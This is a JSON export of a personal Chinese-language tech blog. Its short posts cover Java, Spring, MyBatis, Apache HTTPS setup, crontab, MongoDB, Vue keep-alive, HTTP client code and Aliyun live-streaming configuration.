{"meta":{"title":"DragonBlog","subtitle":null,"description":"dragon-yuan","author":"dragon","url":"http://blog.dragon-yuan.me"},"pages":[{"title":"about","date":"2017-04-04T07:43:06.823Z","updated":"2016-12-12T08:41:01.793Z","comments":false,"path":"about.html","permalink":"http://blog.dragon-yuan.me/about.html","excerpt":"","text":"window.location.href='about/about-me.html';"}],"posts":[{"title":"Spring Boot中使用@ConditionalOnExpression注解","slug":"ConditionalOnExpression","date":"2018-01-20T15:18:10.000Z","updated":"2018-01-20T15:19:29.902Z","comments":true,"path":"2018/01/20/ConditionalOnExpression/","link":"","permalink":"http://blog.dragon-yuan.me/2018/01/20/ConditionalOnExpression/","excerpt":"","text":"123456789// properties中可以配置isEnabled的值，true即开启Bean注入，false为不注入@Configuration@ConditionalOnExpression(\"$&#123;isEnabled&#125;\")public class SomeConfiguration &#123; @Bean public ... ...(... ...) &#123; // 实现 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Maven中的dependencyManagement","slug":"maven-dependencymanagement","date":"2018-01-20T03:11:33.000Z","updated":"2018-01-20T15:26:19.091Z","comments":true,"path":"2018/01/20/maven-dependencymanagement/","link":"","permalink":"http://blog.dragon-yuan.me/2018/01/20/maven-dependencymanagement/","excerpt":"","text":"123456789101112131415161718# pom.xml# 只是对版本进行管理，不会实际引入jar包&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;3.2.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;# 实际下载jar包 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"事物传播行为","slug":"transactional-one","date":"2018-01-16T14:57:15.000Z","updated":"2018-01-16T15:06:35.196Z","comments":true,"path":"2018/01/16/transactional-one/","link":"","permalink":"http://blog.dragon-yuan.me/2018/01/16/transactional-one/","excerpt":"","text":"123456789101112如果有事务，那么加入事务，没有的话新建一个@Transactional(propagation=Propagation.REQUIRED)容器不为这个方法开启事务@Transactional(propagation=Propagation.NOT_SUPPORTED)创建一个新的事务，原来的挂起，新的执行完毕，继续执行老的事务@Transactional(propagation=Propagation.REQUIRES_NEW)必须在一个已有的事务中执行,否则抛出异常@Transactional(propagation=Propagation.MANDATORY)必须在一个没有的事务中执行，否则抛出异常@Transactional(propagation=Propagation.NEVER)如果其他bean调用这个方法，在其他bean中声明事务，那就用事务，如果其他bean没有声明事务，那就不用事务。@Transactional(propagation=Propagation.SUPPORTS)","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"按指定数量拆分List及Mybatis批量插入","slug":"mybatis-batch-insert","date":"2018-01-03T14:44:15.000Z","updated":"2018-01-03T14:53:04.101Z","comments":true,"path":"2018/01/03/mybatis-batch-insert/","link":"","permalink":"http://blog.dragon-yuan.me/2018/01/03/mybatis-batch-insert/","excerpt":"","text":"当数据量过多需要插入到数据库时，因为数据库连接需要的时间较长，所以可以选择连接池并批量插入数据，从而提高效率。1.按指定数量拆分List123456789101112131415161718192021final int LIST_SIZE = 50;List&lt;Object&gt; objList = new ArrayList&lt;&gt;();// 如果小于50个对象，直接插入if (objList.size() &lt;= LIST_SIZE) &#123; for (Object obj : objList) &#123; mapper.insert(obj); &#125;&#125; else &#123; Object[] params = objList.toArray(new Object[]&#123;&#125;); int len = params.length; for (int i = 1; i &lt;= len / LIST_SIZE; i++) &#123; Object[] tmp = Arrays.copyOfRange(params, (i - 1) * LIST_SIZE, i * LIST_SIZE); List&lt;Object&gt; paramList = Arrays.asList(tmp); mapper.insertByBatch(paramList); if (len / LIST_SIZE == i &amp;&amp; len % LIST_SIZE &gt; 0) &#123; tmp = Arrays.copyOfRange(params, objList.size() / LIST_SIZE * LIST_SIZE, len); paramList = Arrays.asList(tmp); mapper.insertByBatch(paramList); &#125; &#125;&#125; 2.Mybatis批量插入数据123456&lt;insert id=\"insertByBatch\" parameterType=\"java.util.List\"&gt; INSERT INTO table (id, code, name) VALUES &lt;foreach collection=\"paramList\" item=\"param\" index=\"index\" separator=\",\"&gt; (#&#123;param.id&#125;, #&#123;param.code&#125;, #&#123;param.name&#125; &lt;/foreach&gt;&lt;/insert&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"2018 - Dragon's Life","slug":"gallery-mylife-2018","date":"2017-12-31T16:00:00.000Z","updated":"2018-01-14T14:22:41.148Z","comments":true,"path":"2018/01/01/gallery-mylife-2018/","link":"","permalink":"http://blog.dragon-yuan.me/2018/01/01/gallery-mylife-2018/","excerpt":"","text":"","categories":[{"name":"Gallery","slug":"Gallery","permalink":"http://blog.dragon-yuan.me/categories/Gallery/"}],"tags":[]},{"title":"为我的新朋友“咕咕”安个家","slug":"hello-my-memobird","date":"2017-12-13T15:17:22.000Z","updated":"2017-12-14T15:49:28.567Z","comments":true,"path":"2017/12/13/hello-my-memobird/","link":"","permalink":"http://blog.dragon-yuan.me/2017/12/13/hello-my-memobird/","excerpt":"","text":"Hello my memobird.我的咕咕号：768047。欢迎加好友调戏！很久前就在网上看到有人种草了，今年双十二在JD果断下单了，一天到货，物流还是棒棒的。开机吓了一跳，自动打印了使用方法，2333，连上WIFI开始了正常模式。（要是充电的就更好了唉）知乎上还有一些有趣的玩法！MEMOBIRD 咕咕机有哪些有趣的玩法？因为咕咕有自己的开放平台，准备搞一搞有趣的东西开发一下，顺便也学习学习新的语言喽。还有啦，希望在2018年，能找到我咕咕机的另一个伴侣~更新下，2017.12.14日部分咕咕~","categories":[{"name":"notes","slug":"notes","permalink":"http://blog.dragon-yuan.me/categories/notes/"}],"tags":[]},{"title":"记录APACHE-HTTPS的配置以及遇到的一些陷阱","slug":"https-config","date":"2017-12-02T17:39:27.000Z","updated":"2017-12-04T14:30:46.279Z","comments":true,"path":"2017/12/03/https-config/","link":"","permalink":"http://blog.dragon-yuan.me/2017/12/03/https-config/","excerpt":"","text":"在开启HTTPS之前，需要服务器防火墙（如果有使用iptables或firewall） httpd.conf123456789#监听80和443端口Listen 80Listen 443#加载mod_ssl模块EnableSendfile onIncludeOptional conf.d/*.confLoadModule ssl_module modules/mod_ssl.soInclude conf.d/ssl.conf ssl.conf123456789101112131415#注意，在此配置文件中不需要监听443，防止重复监听#在对443虚拟路径映射的时候，需要填写固定IP，不要使用*代替&lt;VirtualHost ip:443&gt;#此处填写域名名称ServerName domainSSLEngine onSSLProtocol all -SSLv2 -SSLv3SSLCipherSuite HIGH:!RC4:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!EXP:+MEDIUMSSLHonorCipherOrder on#SSL加密密钥，可以在APACHE根路径下新建cert并存放密钥文件SSLCertificateFile /etc/httpd/cert/public.pemSSLCertificateKeyFile /etc/httpd/cert/214047770560394.keySSLCertificateChainFile /etc/httpd/cert/chain.pem 在配置好文件后，需要重新启动APACHE服务123srevice iptables restartservice httpd restartservice httpd status 开启301；HTTP重定向到HTTPS12345678910#在所需的Directory中，修改AllowOverride为All&lt;Directory &quot;/var/www/html&quot;&gt;AllowOverride All&lt;/Directory&gt;#在网站跟路径增加.htaccess，并写入下面脚本RewriteEngine OnRewriteBase /RewriteCond %&#123;SERVER_PORT&#125; !^443$RewriteRule ^(.*)$ https://domain/$1 [R=301,L]","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"HttpSessionListener与WebListener注解的应用","slug":"HttpSessionListener","date":"2017-11-29T13:19:26.000Z","updated":"2017-11-29T13:29:52.011Z","comments":true,"path":"2017/11/29/HttpSessionListener/","link":"","permalink":"http://blog.dragon-yuan.me/2017/11/29/HttpSessionListener/","excerpt":"","text":"对于Session来说主要就是它的创建和销毁。对于HttpSessionListener这个接口，有两个方法：12345678910@Overridepublic void sessionCreated(HttpSessionEvent httpSessionEvent) &#123; logger.info(\"Session创建...\"); HttpSession session = httpSessionEvent.getSession();&#125;@Overridepublic void sessionDestroyed(HttpSessionEvent httpSessionEvent) &#123; logger.info(\"Session销毁...\");&#125; 当浏览器第一次访问网站的时候，WEB服务器会新建一个HttpSession对象 ，并触发 HttpSession创建事件 ，如果注册了HttpSessionListener事件监听器，则会调用HttpSessionListener事件监听器的sessionCreated方法。相反，当访问结束超时的时候，WEB服务器会销毁相应的HttpSession对象，并触发 HttpSession销毁事件，同时调用所注册HttpSessionListener事件监听器的sessionDestroyed方法。通过httpSessionEvent.getSession()可以获取到新增session的id。通过这个方式，也可以记录当前在线人数。 @WebListener注解此注解来自servlet-api(javax.servlet.annotation.WebListener)WebListener注解将一个实现了特定监听器接口的类定义为监听器，这样就不需要在配置文件中配置监听器的相关描述信息简化了之前WEB.XML中的配置123&lt;listener&gt; &lt;listener-class&gt;MySessionListener&lt;/listener-class&gt;&lt;/listener&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Java关于对象的遍历，类的反射","slug":"java-class-getclass","date":"2017-11-19T09:40:23.000Z","updated":"2017-11-21T14:15:49.402Z","comments":true,"path":"2017/11/19/java-class-getclass/","link":"","permalink":"http://blog.dragon-yuan.me/2017/11/19/java-class-getclass/","excerpt":"","text":"Class类是整个Java反射机制的源头，Class类本身表示Java对象的类型，可通过一个Object对象的getClass()方法取得一个对象的类型，此函数返回的就是一个Class类。 Field提供有关类或接口的属性的信息，以及对他的动态访问权限。Method提供关于类或接口上的方法的信息。 123456789Ojbect obj = new Object();Class&lt;? extends Object&gt; objClass = obj.getClass();Field[] fields = objClass.getDeclaredFields();for (int k = 0; k &lt; fields.length; k++) &#123; String fieldName = fields[k].getName(); Method m = obj.getClass().getMethod(\"get\" + fieldName.substring(0, 1).toUpperCase() + fieldName.substring(1)); Object value = m.invoke(obj); System.out.println(fieldName + \" : \" + value);&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Windows环境下mongodb配置","slug":"windows-mongodb","date":"2017-10-31T12:30:52.000Z","updated":"2017-10-31T12:33:55.717Z","comments":true,"path":"2017/10/31/windows-mongodb/","link":"","permalink":"http://blog.dragon-yuan.me/2017/10/31/windows-mongodb/","excerpt":"","text":"首先安装mongodb不多说了。 配置：1.在自定义的工作空间下新建Data文件夹2.在Data下新建db和log文件夹3.在log文件夹下新建MongoDB.log文件 开启Mongodb Service通过cmd找到mongodb的安装路径并进入bin文件夹下123#\".....\\Data\\db\"为配置中第二项的路径#\".....\\Data\\log\\MongoDB.log\"为配置中第三项的路径mongod -dbpath \".....\\Data\\db\" -logpath \".....\\Data\\log\\MongoDB.log\" -install -serviceName \"MongoDB\" 开启服务 net start mongodb关闭服务 net stop mongodb 删除Mongodb Service123#\".....\\Data\\db\"为配置中第二项的路径#\".....\\Data\\log\\MongoDB.log\"为配置中第三项的路径mongod -dbpath \".....\\Data\\db\" -logpath \".....\\Data\\log\\MongoDB.log\" -remove -serviceName \"MongoDB\"","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"关于时间的处理，以及MyBatis中对时间的处理","slug":"mysql-about-date","date":"2017-10-25T14:04:19.000Z","updated":"2017-10-26T15:10:58.682Z","comments":true,"path":"2017/10/25/mysql-about-date/","link":"","permalink":"http://blog.dragon-yuan.me/2017/10/25/mysql-about-date/","excerpt":"","text":"java123// String -&gt; DateSimpleDateFormat sdf = new SimpleDateFormat(\"\");Date date = sdf.parse(dateString); 123// Date -&gt; StringDate date = new Date();String dateString = (new SimpleDateFormat(\"\")).format(date); 12345// 在日期上增加数个整月Calendar cal = Calendar.getInstance();cal.setTime(new Date());cal.add(Calendar.MONTH, 1);Date date = cal.getTime(); mysql12345# 时间转换DATE_FORMAT(NOW(),'%b %d %Y %h:%i %p') DATE_FORMAT(NOW(),'%m-%d-%Y') DATE_FORMAT(NOW(),'%d %b %y') DATE_FORMAT(NOW(),'%d %b %Y %T:%f') mybatis1234&lt;![CDATA[&gt;]]&gt;&lt;![CDATA[&gt;=]]&gt;&lt;![CDATA[&lt;]]&gt;&lt;![CDATA[&lt;=]]&gt;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"SQL中获取前后一个月","slug":"sql-about-date","date":"2017-10-23T14:07:24.000Z","updated":"2017-10-23T14:07:35.277Z","comments":true,"path":"2017/10/23/sql-about-date/","link":"","permalink":"http://blog.dragon-yuan.me/2017/10/23/sql-about-date/","excerpt":"","text":"123date_add(NOW(), interval 1 MONTH)#date_add()增加#date_sub()减少 month月份；minute分钟；second秒；","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"SQL中UNION和UNION ALL操作符","slug":"sql-union","date":"2017-10-11T14:22:29.000Z","updated":"2017-10-13T13:18:35.376Z","comments":true,"path":"2017/10/11/sql-union/","link":"","permalink":"http://blog.dragon-yuan.me/2017/10/11/sql-union/","excerpt":"","text":"UNION操作符用于合并两个或多个SELECT语句的结果集。UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列的顺序必须相同。UNION操作符选取的是不同的值。如需要重复的值，需要用UNION ALL。123SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Java注释@interface的用法","slug":"java-at-interface","date":"2017-09-18T13:30:59.000Z","updated":"2017-09-18T15:40:22.983Z","comments":true,"path":"2017/09/18/java-at-interface/","link":"","permalink":"http://blog.dragon-yuan.me/2017/09/18/java-at-interface/","excerpt":"","text":"注解大都用在开发框架中。Java用 @interface Annotation{} 定义一个注解 @Annotation，一个注解是一个类。用@Retention(RetentionPolicy.CLASS)修饰的注解，表示注解的信息被保留在class文件(字节码文件)中当程序编译时，但不会被虚拟机读取在运行的时候;用@Retention(RetentionPolicy.SOURCE )修饰的注解,表示注解的信息会被编译器抛弃，不会留在class文件中，注解的信息只会留在源文件中;用@Retention(RetentionPolicy.RUNTIME )修饰的注解，表示注解的信息被保留在class文件(字节码文件)中当程序编译时，会被虚拟机保留在运行时，所以他们可以用反射的方式读取。 定义个一注解@MyTarget，用RetentionPolicy.RUNTIME修饰;123@Retention(RetentionPolicy.RUNTIME) public @interface MyTarget&#123;&#125; 注解@Target也是用来修饰注解的元注解，它有一个属性ElementType也是枚举类型，值为：ANNOTATION_TYPE,CONSTRUCTOR,FIELD,LOCAL_VARIABLE,METHOD,PACKAGE,PARAMETER,TYPE如@Target(ElementType.METHOD) 修饰的注解表示该注解只能用来修饰在方法上。12345@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface MyTarget&#123; String value() default \"val\";&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Linux中crontab定时任务","slug":"linux-crontab","date":"2017-09-13T14:09:17.000Z","updated":"2017-09-21T15:34:35.222Z","comments":true,"path":"2017/09/13/linux-crontab/","link":"","permalink":"http://blog.dragon-yuan.me/2017/09/13/linux-crontab/","excerpt":"","text":"crontab命令的功能是在一定的时间间隔调度一些命令的执行 文件/etc/crontab中每行任务的描述格式如下:123456789minute - 从0到59的整数 hour - 从0到23的整数 day - 从1到31的整数 (必须是指定月份的有效日期)month - 从1到12的整数 (或如Jan或Feb简写的月份)dayofweek - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)command - 需要执行的命令(或执行自定义脚本的命令)root表示以root用户身份来运行run-parts表示后面跟着的是一个文件夹，要执行的是该文件夹下的所有脚本 crontab服务的启动关闭1234sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"Java中的native关键字","slug":"java-native","date":"2017-09-12T14:32:21.000Z","updated":"2017-09-12T14:24:51.584Z","comments":true,"path":"2017/09/12/java-native/","link":"","permalink":"http://blog.dragon-yuan.me/2017/09/12/java-native/","excerpt":"","text":"Native所定义的方法不能有方法体，他所定义的方法实现是由非java语言实现，比如C语言等。 例如：1public native int hashCode(); 标识符native可以与所有其它的java标识符连用，但是abstract除外。这是合理的，因为native暗示这些方法是有实现体的，只不过这些实现体是非java的，但是abstract却显然的指明这些方法无实现体。一个native方法可以返回任何java类型，包括非基本类型，而且同样可以进行异常控制。这些方法的实现体可以自制一个异常并且将其抛出，这一点与java的方法非常相似。native的存在并不会对其他类调用这些本地方法产生任何影响，实际上调用这些方法的其他类甚至不知道它所调用的是一个本地方法。JVM将控制调用本地方法的所有细节。 当一个类第一次被使用到时，这个类的字节码会被加载到内存，并且只会回载一次。在这个被加载的字节码的入口维持着一个该类所有方法描述符的集合，这些方法描述符包含这样一些信息：方法代码存于何处，它有哪些参数，方法的描述符等等。如果一个方法描述符内有native，这个描述符块将有一个指向该方法的实现的指针。这些实现在一些DLL文件内，但是它们会被操作系统加载到java程序的地址空间。当一个带有本地方法的类被加载时，其相关的DLL并未被加载，因此指向方法实现的指针并不会被设置。当本地方法被调用之前，这些DLL才会被加载，这是通过调用java.system.loadLibrary()实现的。 1本文转载自：http://blog.csdn.net/jiakw_1981/article/details/3073613","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"Vue中Keep-Alive缓存的使用","slug":"vue-keepalive","date":"2017-08-30T14:59:09.000Z","updated":"2017-08-30T14:59:01.651Z","comments":true,"path":"2017/08/30/vue-keepalive/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/30/vue-keepalive/","excerpt":"","text":"Vue提供了一个keep-alive组件用来缓存组件。首先在vue的主页路由上添加keep-alive，并且判断是否在路由开启keepAlive1234&lt;keep-alive&gt; &lt;router-view v-if=\"$route.meta.keepAlive\"&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;&lt;router-view v-if=\"!$route.meta.keepAlive\"&gt;&lt;/router-view&gt; 在需要缓存的页面路由上添加标志位1keepAlive: ture vue中生命周期相关的有：created,mounted,updated,activited,destroyed。在页面上可以添加activited钩子函数。针对keep-alive标签，使用keep-alive在单页中前进后退只触发activited。123456created() &#123; method_1();&#125;,activited() &#123; method_2();&#125;","categories":[{"name":"Web Design","slug":"Web-Design","permalink":"http://blog.dragon-yuan.me/categories/Web-Design/"}],"tags":[]},{"title":"IDEA生成序列化ID","slug":"idea-serialVersion","date":"2017-08-16T13:49:27.000Z","updated":"2017-08-16T13:45:24.791Z","comments":true,"path":"2017/08/16/idea-serialVersion/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/16/idea-serialVersion/","excerpt":"","text":"File -&gt; setting -&gt; Inspections -&gt; Serializationissues123将其展开后将serialzable class without serialVersionUID打上勾","categories":[{"name":"Operations","slug":"Operations","permalink":"http://blog.dragon-yuan.me/categories/Operations/"}],"tags":[]},{"title":"使用JAVA压缩文件","slug":"java-zip","date":"2017-08-14T13:44:24.000Z","updated":"2017-08-15T14:32:13.682Z","comments":true,"path":"2017/08/14/java-zip/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/14/java-zip/","excerpt":"","text":"如下方法使用Ant版本1.6.512345678910111213141516171819202122import org.apache.tools.ant.Project;import org.apache.tools.ant.taskdefs.Zip;import org.apache.tools.ant.types.FileSet;import java.io.File;public class CompressionUtil &#123; public static void compress(String desPath, String srcPath)&#123; File desFile = new File(desPath);// 目标文件 File srcFile = new File(srcPath);// 源文件 if (!srcFile.exists()) throw new RuntimeException(\"需要压缩的文件不存在\"); Project project = new Project(); Zip zip = new Zip(); zip.setProject(project); zip.setDestFile(desFile); FileSet fileSet = new FileSet(); fileSet.setProject(project); fileSet.setDir(srcFile); zip.addFileset(fileSet); zip.execute(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"高德地图工具类（原创）","slug":"gaode-java","date":"2017-08-11T13:41:47.000Z","updated":"2017-08-11T14:15:12.854Z","comments":true,"path":"2017/08/11/gaode-java/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/11/gaode-java/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONArray;import com.alibaba.fastjson.JSONObject;import org.apache.http.HttpEntity;import org.apache.http.client.config.RequestConfig;import org.apache.http.client.methods.CloseableHttpResponse;import org.apache.http.client.methods.HttpGet;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClients;import org.apache.http.util.EntityUtils;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import java.io.IOException;/** * 获取高德地图坐标数据 * Created by dragon on 2017/8/10. */public class GaodeMapGeographyUtil &#123; private Logger logger = LoggerFactory.getLogger(this.getClass()); private final String KEY = \"\"; private RequestConfig requestConfig = RequestConfig.custom() .setSocketTimeout(15000) .setConnectTimeout(15000) .setConnectionRequestTimeout(15000) .build(); /** * 方法入口1 : 通过城市名称，详细地址；获取高德地图经纬度 * @param city * @param address * @return 地理坐标 */ public String getContantGeographical(String city,String address) &#123; String getUrl = \"http://restapi.amap.com/v3/geocode/geo?batch=true&amp;address=\" + address + \"&amp;city=\" + city + \"&amp;output=JSON&amp;key=\" + KEY; String location = \"\"; try &#123; HttpGet httpGet = new HttpGet(getUrl); String resultStr = sendHttpGet(httpGet); JSONObject resultObj = JSON.parseObject(resultStr); JSONArray geocodesArray = resultObj.getJSONArray(\"geocodes\"); if (null != geocodesArray &amp;&amp; geocodesArray.size() &gt; 0)&#123; JSONObject geocodesObj = JSON.parseObject(geocodesArray.get(0).toString()); location = geocodesObj.get(\"location\").toString(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return location; &#125; /** * 方法入口2 : 通过高德地图经纬度，逆向获取地址 * @param geographical * @return 地址 */ public String getContantAddressByGeographical(String geographical)&#123; String getUrl = \"http://restapi.amap.com/v3/geocode/regeo?key=\" + KEY + \"&amp;location=\" + geographical + \"&amp;poitype=&amp;radius=1000&amp;extensions=all&amp;batch=false&amp;roadlevel=0\"; String address = \"\"; try &#123; HttpGet httpGet = new HttpGet(getUrl); String resultStr = sendHttpGet(httpGet); JSONObject resultObj = JSON.parseObject(resultStr); Object regeocodeObj = resultObj.get(\"regeocode\"); String jsonString = JSON.toJSONString(regeocodeObj); JSONObject jsonObj = JSON.parseObject(jsonString); address = jsonObj.get(\"formatted_address\").toString(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return address; &#125; /** * 方法入口3 : 测试方法，通过高德地图经纬度，逆向获取地址，POIS * @param geographical * @return 地址 */ public String getContantAddressByGeographicalPois(String geographical)&#123; String getUrl = \"http://restapi.amap.com/v3/geocode/regeo?key=\" + KEY + \"&amp;location=\" + geographical + \"&amp;poitype=&amp;radius=1000&amp;extensions=all&amp;batch=false&amp;roadlevel=0\"; String address = \"\"; double distance = 500; try &#123; HttpGet httpGet = new HttpGet(getUrl); String resultStr = sendHttpGet(httpGet); JSONObject resultObj = JSON.parseObject(resultStr); // 获取 [regeocode] Object regeocodeObj = resultObj.get(\"regeocode\"); String regeocodeObjToStr = JSON.toJSONString(regeocodeObj); JSONObject jsonObj = JSON.parseObject(regeocodeObjToStr); // 获取 [pois] Object poisObj = jsonObj.get(\"pois\"); String poisObjToStr = JSON.toJSONString(poisObj); JSONArray poisArray = JSON.parseArray(poisObjToStr); // 获取最近 [poi] for (int i = 0; i &lt; poisArray.size(); i++)&#123; Object poiObj = poisArray.get(i); String poiStr = JSON.toJSONString(poiObj); JSONObject poi = JSON.parseObject(poiStr); double poiDistance = Double.parseDouble(poi.get(\"distance\").toString()); if (poiDistance &lt; distance)&#123; // 返回地址数据 distance = poiDistance; address = poi.get(\"address\").toString() + poi.get(\"name\").toString(); &#125; &#125; logger.info(\"address = \" + address + \" , \" +\"pois.distance = \" + distance); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return address; &#125; private String sendHttpGet(HttpGet httpGet) &#123; CloseableHttpClient httpClient = null; CloseableHttpResponse response = null; HttpEntity entity = null; String responseContent = null; try &#123; httpClient = HttpClients.createDefault(); httpGet.setConfig(requestConfig); response = httpClient.execute(httpGet); entity = response.getEntity(); responseContent = EntityUtils.toString(entity, \"UTF-8\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (response != null) &#123; response.close(); &#125; if (httpClient != null) &#123; httpClient.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return responseContent; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"值得纪念的第一百篇博客","slug":"100","date":"2017-08-10T13:00:00.000Z","updated":"2017-08-11T13:22:37.216Z","comments":true,"path":"2017/08/10/100/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/10/100/","excerpt":"","text":"自2015年3月29日第一次注册域名，搭建博客开始不断的积累着。两年半的时间里，从大学到毕业，如今已经积累到整整100篇博文了。希望通过写博客来记录我的技术成长和生活琐事。 在生活上，希望自己能够摆正心态，从心理学的角度来讲，心态是一个人的心理活动和状态的总和，是人们对社会生活的反映和体验。心态对一个人的思想、情感、需要和欲望有着决定性的影响，它制约着一个人对待工作、对待生活、对待事业的态度。心态是把双刃剑，积极的心态往往能够成就人生，相反消极的心态则往往影响成功。 从大四的实习，到如今的毕业，有了属于自己的正式工作。在工作上，希望自己能记住这几句话：工资不是用来支付给技能的，不要以为技能越高、工资自然应该越高。 工资是用来支付给责任的，责任越大，工资越高。 涨工资，是因为承担了更大的责任。 愿自己继续坚持，加油！加油！加油！","categories":[{"name":"Reading","slug":"Reading","permalink":"http://blog.dragon-yuan.me/categories/Reading/"}],"tags":[]},{"title":"HttpClient中GET请求","slug":"httpclient-get","date":"2017-08-09T13:41:21.000Z","updated":"2017-08-13T14:52:06.560Z","comments":true,"path":"2017/08/09/httpclient-get/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/09/httpclient-get/","excerpt":"","text":"HttpClient版本4.5.212345private RequestConfig requestConfig = RequestConfig.custom() .setSocketTimeout(15000) .setConnectTimeout(15000) .setConnectionRequestTimeout(15000) .build(); 123456789101112131415161718192021222324252627private String sendHttpGet(HttpGet httpGet) &#123; CloseableHttpClient httpClient = null; CloseableHttpResponse response = null; HttpEntity entity = null; String responseContent = null; try &#123; httpClient = HttpClients.createDefault(); httpGet.setConfig(requestConfig); response = httpClient.execute(httpGet); entity = response.getEntity(); responseContent = EntityUtils.toString(entity, \"UTF-8\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (response != null) &#123; response.close(); &#125; if (httpClient != null) &#123; httpClient.close(); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; return responseContent;&#125; 入口：12HttpGet httpGet = new HttpGet(getUrl);String resultStr = sendHttpGet(httpGet)","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"HttpURLConnection中GET请求","slug":"http-url-connection","date":"2017-08-09T13:11:21.000Z","updated":"2017-08-09T13:24:39.263Z","comments":true,"path":"2017/08/09/http-url-connection/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/09/http-url-connection/","excerpt":"","text":"123456789101112131415161718public static void httpURLConectionGET() &#123; try &#123; URL url = new URL(\"\"); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); connection.connect(); BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\")); String line; StringBuilder sb = new StringBuilder(); while ((line = br.readLine()) != null) &#123; sb.append(line); &#125; br.close(); connection.disconnect(); System.out.println(sb.toString()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://blog.dragon-yuan.me/categories/Java/"}],"tags":[]},{"title":"阿里云直播配置与使用（初体验）","slug":"aliyun-video","date":"2017-08-02T13:39:27.000Z","updated":"2017-09-13T14:04:49.350Z","comments":true,"path":"2017/08/02/aliyun-video/","link":"","permalink":"http://blog.dragon-yuan.me/2017/08/02/aliyun-video/","excerpt":"","text":"完整的推流地址：形如：rtmp://video-center.alivecdn.com/{AppName}/{StreamName}?vhost={yourdomain}12345// 说明 video-center.alivecdn.com是直播中心服务器，允许自定义// 例如您的域名是your.example.com（注意：该域名不可以和你的直播加速域名相同）// 可以设置DNS，将您的 域名CNAME指向video-center.alivecdn.com即可 // app-name是应用名称，支持自定义，可以更改video-name是流名称，支持自定义// 可以更改 vhost参数是最终在边缘节点播放的域名，即你的直播加速域名。 推流（OBS）：例如：rtmp://video.dragon-yuan.me/live_dragon/dragon?vhost=live.dragon-yuan.me推流则需要配置如下：12// FMS(URL) 为 rtmp://video.dragon-yuan.me/live_dragon/// 串流码 为 